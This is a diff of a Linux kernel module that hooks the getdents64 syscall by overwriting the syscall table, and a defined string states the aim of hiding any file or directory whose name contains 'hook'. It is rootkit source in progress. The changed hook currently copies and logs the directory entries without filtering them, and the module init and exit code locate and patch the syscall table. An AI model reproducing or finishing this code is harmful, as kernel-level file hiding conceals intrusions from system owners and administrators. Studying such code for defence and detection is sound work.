@@ -10,51 +10,54 @@
 
 #define IGNORE_TEXT "hook"                      //<- Text on file/dir to hide. If a file contains this text, hides it
 
-static unsigned long *__sys_call_table;                         //<- Pointer to the Kernel syscall table
+static unsigned long *__sys_call_table;         //<- Pointer to the Kernel syscall table
 
-asmlinkage long (*original_getdents64) (const struct pt_regs *regs);
-
+asmlinkage long (*original_getdents64) (const struct pt_regs *regs);  //<- Original getdents64 syscall definition
 
 asmlinkage int hooked_getdents64(const struct pt_regs *regs)
 {
-        struct linux_dirent64 __user * direntry;      //<- Points to the direntry returned by original getdents
-        struct linux_dirent64 * dir_current;          //<- Points to the actual treated direntry
-        unsigned long n_size;                         //<- size of all direntries
-        unsigned long offset = 0;                     //<- Offset between direntries
-                                                      //   To go througth all direntries
-        unsigned int i = 0;                           //<- Just a counter
+        struct linux_dirent64 __user * dirent = (struct linux_dirent64 *)regs->si;
+        long values;                                              //<- Will store results for error checking
+        struct linux_dirent64 * current_dir, * dirent_ker = NULL;
+        unsigned long offset = 0;                                 //<- Offset used to point to the next linux_dirent64
 
-        pr_info("   Syscall hooked.\n");
-
-        n_size = original_getdents64(regs);             //<- Call to the orinal getdents
-                                                        //   n_size <- total size of direntries
-                                                        //   In regs the RSI reg with the @ of direntry
-        direntry = (struct linux_dirent64 *) regs->si;  //<- direntry <- @ referenced in RSI register
-
-        dir_current = (void *) direntry;
-        pr_info("   Entry ONE: %s of size %d.\n", dir_current->d_name, dir_current->d_reclen);
-
-        dir_current = (void *) dir_current + dir_current->d_reclen;
-        pr_info("   Entry TWO: %s of size %d.\n", dir_current->d_name, dir_current->d_reclen);
-
-        dir_current = (void *) dir_current + dir_current->d_reclen;
-        pr_info("   Entry THREE: %s of size %d.\n", dir_current->d_name, dir_current->d_reclen);
-
-        dir_current = (void *) dir_current + dir_current->d_reclen;
-        pr_info("   Entry FOUR: %s of size %d.\n", dir_current->d_name, dir_current->d_reclen);
-/*
-        dir_current = (void *) direntry;
-
-        while ( offset < n_size )                      //<- Loop over the direntries and print info
-        {
-                pr_info("   Entry %d: %s, size of %d.\n", i, dir_current->d_name, dir_current->d_reclen);
-                offset += dir_current->d_reclen;
-                dir_current = (void *) dir_current + dir_current->d_reclen;
-                i++;
+        int ret = original_getdents64(regs);                      //<- Call the original getdents64 to get the linux_direntry-es
+        if (ret <= 0) {                                           //<- Error checking
+                pr_err("   Error calling original getdents64.\n");
+                return ret;
         }
-*/
-        
-        return n_size;
+
+        dirent_ker = kzalloc(ret, GFP_KERNEL);                    //<- Reserve memory to copy the returned linux_direntry-es from previous line
+        if (dirent_ker == NULL) {                                 //<- Error checking.
+                pr_err("   Error allocating memory space.\n");
+                return ret;
+        }
+
+        values = copy_from_user(dirent_ker, dirent, ret);         //<- Move from user space to kernel space
+        if (values) {                                             //<- Error checking
+                pr_err("   Error copying from user to kernel space.\n");
+                return ret;
+        }
+
+        while (offset < ret)                                     //<- Loop while offset is not equal to direntries size
+        {
+                current_dir = (void *)dirent_ker + offset;       //<- We go increasing the value of current dir with
+                                                                 //   offset, to point to the next direntry
+                pr_info("   ENTRY: %s, size %d.\n", current_dir->d_name, current_dir->d_reclen);
+                
+                offset += current_dir->d_reclen;                 //<- Offset has to be increased by the size of the 
+                                                                 //   actual direntry
+        }
+
+        values = copy_to_user(dirent, dirent_ker, ret);          //<- Results go to UserSpace
+        if (values) {
+                pr_err("    Error copying from kernel to user space.\n");
+                return ret;
+        }
+
+        kfree(dirent_ker);                                       //<- Release reserved Kernel Space
+
+        return ret;                                              //<- Return the size of all direntries
 }
 
 
@@ -64,8 +67,8 @@ static int __init lkm_init(void)
 
         __sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");     //<- Get address for Kernel Syscall Table
 
-        if (__sys_call_table == NULL) {
-                pr_err("  Can't find syscall table!.\n");
+        if (__sys_call_table == NULL) {                                         //<- Error Checking
+                pr_err("  Can't find syscall table.\n");
                 return -1;
         }
 
@@ -86,14 +89,14 @@ static void __exit lkm_exit(void)
 
         my_memory_rw();
 
-        __sys_call_table[__NR_getdents64] = (unsigned long) original_getdents64;
+        __sys_call_table[__NR_getdents64] = (unsigned long) original_getdents64;   //<- Restore Syscall table with original getdents64
 
         my_memory_ro();
 
 }
 
-module_init(lkm_init);           //<- Tells that Init Kernel Module is the lkm_init function
-module_exit(lkm_exit);          //<- Tells that Exit Kernel Function is lkm_exit
+module_init(lkm_init);           
+module_exit(lkm_exit);          
 
 MODULE_AUTHOR("Guillem Alminyana");
 MODULE_LICENSE("GPL");
